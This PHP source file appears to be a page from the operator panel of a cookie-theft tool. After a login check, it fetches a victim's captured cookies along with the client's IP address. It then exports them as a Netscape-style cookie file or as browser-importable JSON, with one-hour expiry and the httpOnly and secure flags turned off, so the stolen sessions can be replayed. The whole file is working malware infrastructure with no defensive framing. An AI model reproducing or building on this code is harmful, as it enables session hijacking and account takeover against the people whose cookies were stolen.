<?php
require_once ('includes/functions.php');

$login = new Login();
$template = new Template();

if (!$login->loggedIn()) {
    $template->showLogin();
}

//
$id = $_GET["id"];

$db->bind("unique_id", $id);
$cookieData = $db->row("SELECT cl.client_id, cl.ip, co.client_id, co.unique_id, co.website, co.cookie, co.time FROM clients AS cl JOIN cookies AS co ON cl.client_id = co.client_id WHERE co.unique_id = :unique_id ");

if (empty($cookieData)) $template->showMessage("Invalid cookie id.", "Error");

if ($_GET["dl"] == "ie") {
    
    $cookies = explode("; ", $cookieData["cookie"]);
    foreach ($cookies as $k => $v) {
        list($name, $value) = explode("=", $v);
        
        echo "." . $cookieData["website"] . " 	FALSE	/	FALSE	" . (time() + 60 * 60) . "	" . $name . "	" . $value . PHP_EOL . "<br>";
    }
    die();
}

if ($_GET["dl"] == "etc") {
        
    $cookies = explode("; ", $cookieData["cookie"]);
    
    $outputArray = array();

        
    foreach ($cookies as $k => $v) {
        list($name, $value) = explode("=", $v);
        
        $outputArray[] = array(
            'domain' => "." . $cookieData["website"],
            "expirationDate" => (time() + 60 * 60),
            "hostOnly" => false,
            "httpOnly" => false,
            "name" => $name,
            "path" => "/",
            "secure" => false,
            "session" => false,
            "storeId" => "0",
            "value" => $value,
            "id" => $i
        );

    }

    echo json_encode($outputArray);
    die();
}


$template->showHeader("Listing all captured cookies");

$template->showCookie($cookieData);

$template->showFooter();
?>